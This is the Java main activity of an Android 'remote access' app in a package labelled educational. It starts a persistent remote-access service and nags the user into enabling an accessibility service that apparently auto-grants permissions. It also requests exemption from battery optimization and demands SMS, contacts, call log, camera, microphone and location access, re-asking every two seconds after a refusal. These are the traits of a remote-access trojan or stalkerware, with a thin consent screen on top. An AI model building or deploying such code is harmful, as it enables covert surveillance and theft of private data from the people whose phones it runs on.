package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.utils.PreferenceManager;
import android.provider.Settings;
import android.net.Uri;
import android.os.PowerManager;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private TextView statusText;
    private Button consentButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        statusText = findViewById(R.id.statusText);
        consentButton = findViewById(R.id.consentButton);

        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            startRemoteAccessService();

            if (!permissionManager.isAccessibilityServiceEnabled()) {
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            } else {
                requestBatteryOptimization();
                requestNecessaryPermissions();
            }
        } else {
            showConsentRequired();
        }

        consentButton.setOnClickListener(v -> {
            if (!preferenceManager.isConsentGiven()) {
                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                startActivity(intent);
            } else {
                revokeConsent();
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();

            if (permissionManager.isAccessibilityServiceEnabled()) {
                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                if (svc != null) svc.startGrantPermsTimer();
                requestNecessaryPermissions();
            } else {
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            }
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName())
                );
                startActivity(intent);
            }
        }
    }

    private void showActiveStatus() {
        statusText.setText("✓ Remote Access Active\n\nYour device is connected and can be managed remotely.");
        consentButton.setText("Revoke Access");
    }

    private void showConsentRequired() {
        statusText.setText("⚠ Consent Required\n\nPlease provide consent to enable remote access features.");
        consentButton.setText("Give Consent");
    }

    private void startRemoteAccessService() {
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        startForegroundService(serviceIntent);
    }

    private void revokeConsent() {
        preferenceManager.setConsentGiven(false);
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        stopService(serviceIntent);
        showConsentRequired();
    }

    private void startPollingForAccessibility() {
        new android.os.Handler().postDelayed(() -> {
            if (permissionManager.isAccessibilityServiceEnabled()) {
                requestBatteryOptimization();
                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                if (svc != null) svc.startGrantPermsTimer();
                requestNecessaryPermissions();
            } else {
                startPollingForAccessibility();
            }
        }, 1000);
    }

    private static final int PERMISSION_REQUEST_CODE = 100;

    private void requestNecessaryPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 2000);
        }
    }
}
